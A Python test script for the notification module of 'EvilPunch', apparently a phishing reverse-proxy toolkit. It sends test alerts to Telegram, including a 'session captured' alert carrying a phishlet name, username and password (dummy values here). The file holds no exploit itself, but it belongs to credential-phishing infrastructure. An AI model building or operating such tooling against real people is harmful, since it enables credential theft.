#!/usr/bin/env python3
"""
Test script for the notification system
"""

import os
import sys
import django

# Add the project directory to Python path
sys.path.append(os.path.join(os.path.dirname(__file__), 'evilpunch'))

# Set Django environment
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'evilpunch.settings')
django.setup()

from evilpunch.core.notify import (
    send_notification, 
    notify_session_captured, 
    notify_proxy_status_change, 
    notify_server_status_change,
    notify_error
)

def test_notifications():
    """Test all notification functions"""
    print("🧪 Testing Notification System...")
    print("=" * 50)
    
    # Test 1: Basic notification
    print("\n1. Testing basic notification...")
    success = send_notification("🧪 Test notification from EvilPunch!", "test")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 2: Session captured notification
    print("\n2. Testing session captured notification...")
    session_data = {
        'phishlet_name': 'test_phishlet',
        'captured_username': 'testuser',
        'captured_password': 'testpass123',
        'ip_address': '192.168.1.100',
        'created': '2024-01-01 12:00:00'
    }
    success = notify_session_captured(session_data)
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 3: Proxy status change notification
    print("\n3. Testing proxy status change notification...")
    success = notify_proxy_status_change("Test Proxy", "active")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 4: Server status change notification
    print("\n4. Testing server status change notification...")
    success = notify_server_status_change("proxy", "running")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 5: Error notification
    print("\n5. Testing error notification...")
    success = notify_error("Test error message", "Test Context")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    print("\n" + "=" * 50)
    print("🎯 Notification testing completed!")
    
    if not success:
        print("\n⚠️  Some notifications failed. This might be because:")
        print("   - Telegram bot token is not configured")
        print("   - Telegram chat ID is not configured")
        print("   - Notifications are disabled")
        print("   - Network connectivity issues")
        print("\n💡 Configure your notification settings in the dashboard first!")

if __name__ == "__main__":
    test_notifications()
